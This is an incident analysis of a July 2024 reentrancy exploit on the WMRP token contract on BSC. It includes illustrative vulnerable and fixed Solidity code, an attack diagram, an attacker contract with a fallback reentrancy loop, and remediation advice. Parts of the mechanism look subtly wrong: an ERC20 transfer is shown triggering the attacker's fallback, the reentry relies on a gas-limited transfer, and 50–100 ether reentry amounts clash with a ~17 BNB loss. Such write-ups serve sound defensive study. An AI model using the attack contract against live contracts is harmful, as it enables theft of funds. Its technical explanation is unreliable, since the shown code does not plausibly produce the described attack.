# MRP (WMRP) — Token Balance Manipulation via Fallback Reentrancy Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-20 |
| **Protocol** | MRP / WMRP |
| **Chain** | BSC |
| **Loss** | ~17 BNB |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | WMRP Token Contract |
| **Root Cause** | Repeated manipulation of WMRP contract state via reentrancy through `fallback()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/MRP_exp.sol) |

---

## 1. Vulnerability Overview

The WMRP token contract triggered an external call before updating state in its logic for receiving ETH and distributing MRP tokens. The attacker sent an initial amount of BNB to the WMRP contract, then exploited a fallback reentrancy loop — transferring MRP tokens and repeatedly sending BNB — to accumulate an MRP balance exceeding 6,000 ether. The attacker then realized profits via distributed transfers.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: external call before state update on ETH receive (CEI pattern violation)
receive() external payable {
    uint256 mrpAmount = calculateMRP(msg.value);
    // ❌ External transfer call before state update — reentrancy possible
    IMRP(MRP_TOKEN).transfer(msg.sender, mrpAmount);
    totalDistributed += mrpAmount;  // ❌ State update occurs after reentrancy
}

// ✅ Correct code: Apply CEI (Checks-Effects-Interactions) pattern
receive() external payable {
    uint256 mrpAmount = calculateMRP(msg.value);
    totalDistributed += mrpAmount;  // ✅ State update first
    IMRP(MRP_TOKEN).transfer(msg.sender, mrpAmount);  // ✅ External call after
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Send initial BNB to WMRP contract
  │
  ├─[2]─► Transfer MRP tokens to WMRP contract (prepare for state manipulation)
  │
  ├─[3]─► Send additional BNB → WMRP.receive() executes
  │         └─► MRP.transfer(attacker, amount) called
  │               └─► Attacker fallback() triggered
  │                     └─► On receiving 50~100 ether, recursive call made
  │                           └─► Send BNB back to WMRP contract
  │                                 └─► Repeat from [3]
  │
  ├─[4]─► Accumulate MRP balance to 6000+ ether, then exit loop
  │
  ├─[5]─► Verify balance (assert)
  │
  ├─[6]─► Realize profits via 20 distributed MRP token transfers
  │
  └─[7]─► Total loss: ~17 BNB
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    address constant WMRP = /* WMRP contract address */;
    IERC20 MRP = IERC20(/* MRP token address */);
    uint256 reentryCount;

    function attack() external payable {
        // [1] Send initial BNB
        payable(WMRP).transfer(msg.value / 2);
        // [2] Transfer MRP tokens to WMRP
        MRP.transfer(WMRP, MRP.balanceOf(address(this)));
        // [3] Send BNB to trigger reentrancy
        payable(WMRP).transfer(address(this).balance);
    }

    fallback() external payable {
        // [3] Recursive call when receiving 50~100 ether
        if (msg.value >= 50 ether && msg.value <= 100 ether && reentryCount < 30) {
            reentryCount++;
            payable(WMRP).transfer(msg.value);  // ❌ Reentrancy loop
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Reentrancy Attack — `receive()` callback executes before state update after ETH transfer (CEI pattern violation) |
| **Attack Technique** | Fallback Reentrancy via ETH Receive |
| **DASP Category** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Enforce CEI Pattern**: Perform state updates before any external calls.
2. **Apply ReentrancyGuard**: Apply OpenZeppelin `ReentrancyGuard`'s `nonReentrant` modifier to all ETH receive/transfer functions.
3. **Isolate ETH Receive Logic**: Avoid complex state-changing logic inside `receive()` and `fallback()`.
4. **Reentrancy Detection Flag**: Explicitly track reentrancy status using a `_locked` boolean.

## 7. Lessons Learned

- **Danger of ETH Transfers**: Sending ETH triggers the recipient's `receive()` or `fallback()`, which can in turn call back into your own contract.
- **Reentrancy = State Inconsistency**: When reentrancy occurs, the state from the first call has not yet been updated, causing balances to be double-counted.
- **Small Losses Still Matter**: Although the loss was only 17 BNB, the attack pattern is identical to exploits worth millions of dollars.